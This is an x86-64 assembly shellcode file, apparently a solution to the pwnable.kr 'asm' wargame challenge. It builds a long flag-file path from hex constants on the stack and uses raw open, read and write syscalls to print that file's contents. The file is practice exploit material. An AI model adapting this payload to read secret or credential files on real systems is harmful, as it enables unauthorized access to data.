#define O_RDONLY    0
#define O_WRONLY    1
#define O_CREAT     64

#define N_READ  0
#define N_WRITE 1
#define N_OPEN  2
#define N_EXIT 60

#define SYSCALL(n) mov rax, n; syscall

#define SYSCALL_READ SYSCALL(N_READ)
#define SYSCALL_WRITE SYSCALL(N_WRITE)
#define SYSCALL_OPEN SYSCALL(N_OPEN)
#define SYSCALL_EXIT SYSCALL(N_EXIT)

#define BUFFER_SIZE 30

.intel_syntax noprefix
.global _start
_start:
    // open(FLAG_FILENAME, O_RDONLY, 0)
    push 0x00
    mov rbx, 0x676e6f306f306f30
    push rbx
    mov rbx, 0x6f306f306f306f30
    push rbx
    mov rbx, 0x3030303030303030
    push rbx
    mov rbx, 0x3030306f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f303030303030
    push rbx
    mov rbx, 0x3030303030303030
    push rbx
    mov rbx, 0x3030303030303030
    push rbx
    mov rbx, 0x3030306f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6f
    push rbx
    mov rbx, 0x6f6f6f6f6f6f6f6c
    push rbx
    mov rbx, 0x5f797265765f7369
    push rbx
    mov rbx, 0x5f656d616e5f656c
    push rbx
    mov rbx, 0x69665f6568745f79
    push rbx
    mov rbx, 0x72726f732e656c69
    push rbx
    mov rbx, 0x665f736968745f64
    push rbx
    mov rbx, 0x6165725f65736165
    push rbx
    mov rbx, 0x6c705f656c69665f
    push rbx
    mov rbx, 0x67616c665f726b2e
    push rbx
    mov rbx, 0x656c62616e77705f
    push rbx
    mov rbx, 0x73695f736968742f
    push rbx
    mov rbx, 0x2f2f2f2f2f2f2f2e
    push rbx
    mov rdi, rsp
    mov rsi, O_RDONLY
    mov edx, 0
    SYSCALL_OPEN;

    test rax, rax
    js  fail

    // r12 = fd
    mov r12, rax

    // create buffer r14[BUFFER_SIZE]
    sub rsp, BUFFER_SIZE
    mov r14, rsp

    // read(fd_in, buffer, BUFFER_SIZE)
    mov rdi, r12
    mov rsi, r14
    mov edx, BUFFER_SIZE
    SYSCALL_READ;

    mov rdx, rax

    // write(STDOUT_FILENO, buffer, BUFFER_SIZE)
    mov edi, 1
    mov rsi, r14
    SYSCALL_WRITE;

    mov edi, 0
    SYSCALL_EXIT;


fail:
    // write(1, "FAIL\n", 5)
    push 0x0
    mov rbx, 0x0a4c494146
    push rbx
    mov edi, 1
    mov rsi, rsp
    mov edx, 5
    SYSCALL_WRITE;

    SYSCALL_EXIT;